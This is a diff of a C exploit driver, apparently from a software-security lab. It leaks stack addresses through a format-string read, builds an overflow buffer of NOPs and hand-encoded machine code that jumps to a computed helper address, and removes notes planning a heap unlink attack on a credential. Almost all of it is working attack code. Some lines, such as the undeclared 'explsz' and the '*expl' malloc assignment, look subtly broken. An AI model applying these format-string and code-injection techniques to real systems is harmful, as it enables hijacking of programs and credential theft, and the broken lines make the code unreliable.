@@ -20,17 +20,24 @@ int main() {
     get_formatted("%p", &cur_main_bp);
     fprintf(stderr, "driver: Extracted cur_main_bp=%lx\n", cur_main_bp);
 
+    // The probed offset is 219 for the return address for main_loop
+    put_str("e %219$p\n");
+    send();
+    uint64_t curr_main_loop_return_addr;
+    get_formatted("%p", &curr_main_loop_return_addr);
+    fprintf(stderr, "driver: Extracted curr_main_loop_return_addr=%lx\n", curr_main_loop_return_addr);
+
     uint64_t cur_auth_bp = cur_main_bp + auth_main_bp_dist;
-    uint64_t cur_return_addr_loc = cur_auth_bp + 8;    
+    uint64_t cur_return_addr_loc = cur_main_bp + main_loop_return_addr_dist;
     uint64_t curr_auth_cred = cur_auth_bp - auth_bp_cred_dist;
-    
+    uint64_t curr_private_helper_addr   = curr_main_loop_return_addr + private_helper_distance;
 
     put_str("u 1234567\n");
     send();
     get_formatted("%*s");
 
-    unsigned explsz = 528;
-    void* *expl = (void**)malloc(explsz);
+    explsz = 528;
+    *expl = (void**)malloc(explsz);
     // Initialize the buffer with '\1' to make the contents predictable.
     memset((void*)expl, '\1', explsz);
     expl[explsz/sizeof(void*)-4] = (void*) 0x0000000000000000;
@@ -48,7 +55,40 @@ int main() {
     send();
     get_formatted("%*s");
 
-    put_str("u 1234567\n");
+    explsz = auth_db_cred_dist - 8;
+    *expl = (void**)malloc(explsz);
+    memset((void*)expl, 0x90, explsz);
+
+    uint64_t injected_code[64] = {
+        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov    <private helper addr>, %rax
+	    0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+        0xff, 0xe0, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90  // jmpq   *%rax
+    };
+    int injected_code_size = sizeof(injected_code) / sizeof(injected_code[0]);
+
+    // Setting private helper addr in the injected code
+    for (int i = 0; i < 8; i++) {
+        uint8_t byte = (curr_private_helper_addr >> (i * 8)) & 0xFF;
+        injected_code[i+2] = byte;
+    }
+
+    // Adding the injected code to expl
+    int curr_expl_location = 0;
+    int shift_bytes = 0;
+    for(int i = 0; i < injected_code_size; i++) {
+        if(i % 8 == 0) {
+            curr_expl_location++;
+            expl[curr_expl_location] = 0x0000000000000000;
+            shift_bytes = 0;
+        }
+        expl[curr_expl_location] += injected_code[i] << (shift_bytes*8);
+        shift_bytes++;
+    }
+
+    put_str("u ");
+    put_bin((char*)expl, explsz);
+    put_str("\n");
     send();
     get_formatted("%*s");
 
@@ -64,6 +104,9 @@ int main() {
     send();
     get_formatted("%*s");
 
+    put_str("p 1234567\n");
+    send();
+    get_formatted("%*s");
 
     put_str("l \n");
     send();
@@ -81,36 +124,3 @@ int main() {
 
     return 0;
 }
-
-
-// current->next->prev = current->prev;
-
-// Send p
-// Send u with overflow to set prev = stack addr
-// Send p with overflow to set in use = 0, prev = cred
-// Send u
-// Send p with overflow to set size=1024
-// Send l
-
-
-/*
-
-    p -> u(size=1024)    p -> u (in_use=0, next=p, prev=<cred>)      p (prev=<stack_addr>)
-
-
-
-
-
-    p -> u (size=1024) -> p -> u (in_use = 0, prev = cred) -> p (prev=stackaddr)
-
-
-
-
-
-    c00
-    c10
-
-    e00
-    e10
-
-*/
